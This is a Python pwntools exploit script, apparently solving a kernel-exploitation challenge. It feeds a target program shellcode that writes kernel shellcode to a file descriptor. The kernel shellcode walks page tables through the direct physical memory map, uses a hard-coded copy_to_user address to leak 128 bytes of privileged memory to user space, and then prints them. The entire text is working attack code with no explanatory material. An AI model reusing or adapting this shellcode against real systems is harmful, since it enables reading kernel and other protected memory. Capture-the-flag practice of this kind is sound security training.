#!/bin/python

import os 
import sys
import fcntl
from pwn import * 

context.arch = 'amd64'

MEM_START = 0x31337000
MEM_SIZE  = 0x1000
COPY_TO_USER = 0xffffffff813b0f20

kernel_sc_asm = asm(f'''
    mov rax, QWORD PTR gs:0x15d00
    mov rax, qword [rax + 0x4b0]  # child

    mov ecx, 0x1b
    mov    r8d,0x404
    movabs rdi,0x7fffffffff000
    movabs rsi,0xffff888000000000

    mov    rax,QWORD PTR [rax-0xe0]
    mov    rax,QWORD PTR [rax+0x50]

    .rept 11 * 4
    nop
    .endr
    xchg   ax,ax

loop:
    mov    rdx,r8
    and    rax,0xfffffffffffff000
    shr    rdx,cl
    sub    ecx,0x9
    and    edx,0x1ff
    mov    r9,QWORD PTR [rax+rdx*8]
    and    r9,rdi
    lea    rax,[r9+rsi*1]
    cmp    ecx,0xfffffff7
    jne    loop
    movabs rax,0xffff888000000040
    lea    rsi,[r9+rax*1]

    mov    rdi, {MEM_START+MEM_SIZE-128}
    mov    rdx, 128
    mov    rax, {COPY_TO_USER}
    call   rax

    mov rax, 0xffffffff810bc8e0
    call rax

    ret
''')

kernel_sc_len = len(kernel_sc_asm)
#print("Len of kernel asm: " + str(kernel_sc_len))

sc_asm  = asm(shellcraft.write(3, MEM_START + 0x30, kernel_sc_len)
            + shellcraft.write(1, MEM_START + MEM_SIZE - 128, 128))
sc_asm += cyclic(0x30 - len(sc_asm)) + kernel_sc_asm
                        

argv = [sys.argv[1]]
if (len(sys.argv) > 2):
    argv.insert(0, 'strace')
    argv.insert(0, 'sudo')

proc = process(argv)
proc.send(sc_asm)
proc.interactive()
